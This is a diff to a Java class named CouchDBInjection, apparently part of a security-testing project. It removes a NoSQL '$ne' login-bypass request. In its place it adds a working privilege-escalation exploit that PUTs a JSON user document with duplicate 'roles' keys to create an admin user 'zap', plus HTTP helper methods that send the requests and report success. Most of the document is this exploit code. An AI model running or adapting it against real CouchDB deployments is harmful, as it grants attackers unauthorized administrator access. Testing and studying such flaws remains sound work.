@@ -2,6 +2,7 @@ package it.org.polito.couchdb;
 import java.io.BufferedReader;
 import java.io.IOException;
 import java.io.InputStreamReader;
+import java.io.OutputStreamWriter;
 import java.net.HttpURLConnection;
 import java.net.URL;
 import org.json.JSONArray;
@@ -24,7 +25,16 @@ public class CouchDBInjection {
     // Methods
 
     public void injection161(String user) throws IOException {
-        sendGET(ipAddr + "/login?user=" + user + "&password[%24ne]=");
+        String body = "{\"name\": \"zap\", \"password\": \"zap\", \"roles\": [\"_admin\"], \"roles\": [], \"type\": \"user\"}";
+        JSONObject res = sendPUT(ipAddr + "/insertDoc?name=zap", body);
+
+        if(res.optInt("code", -1) == 200 &&
+                res.optBoolean("ok", false))
+            System.out.println("\n---------- USER \"zap\" CREATED WITH ADMIN PRIVILEGES! ----------\n");
+        else if(res.optString("error", "\0").compareTo("conflict") == 0)
+            System.out.println("\n--------------- USER ALREADY EXISTS! ---------------\n");
+        else
+            System.out.println("\n---------- USER CANNOT BE CREATED WITH ADMIN PRIVILEGES! ----------\n");
     }
 
     public void injection311passwordBypass() throws IOException {
@@ -83,6 +93,42 @@ public class CouchDBInjection {
         URL obj = new URL(url);
         HttpURLConnection con = (HttpURLConnection) obj.openConnection();
         con.setRequestMethod("GET");
+        int responseCode = con.getResponseCode();
+        System.out.println("GET Response Code :: " + responseCode);
+
+        BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
+        String inputLine;
+        StringBuilder response = new StringBuilder();
+
+        while ((inputLine = in.readLine()) != null) {
+            response.append(inputLine);
+        }
+        in.close();
+
+        // print result
+        JSONObject myResponse = new JSONObject(response.toString());
+        myResponse.put("code", responseCode);
+        //System.out.println(myResponse.toString());
+
+        return myResponse;
+
+    }
+
+    private static JSONObject sendPUT(String url, String data) throws IOException {
+        URL obj = new URL(url);
+        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
+        con.setDoOutput(true);
+        con.setRequestMethod("PUT");
+        con.setRequestProperty("Content-Type", "application/json");
+        try {
+            OutputStreamWriter osw = new OutputStreamWriter(con.getOutputStream());
+            osw.write(data);
+            osw.flush();
+            osw.close();
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+
         int responseCode = con.getResponseCode();
         System.out.println("GET Response Code :: " + responseCode);
 
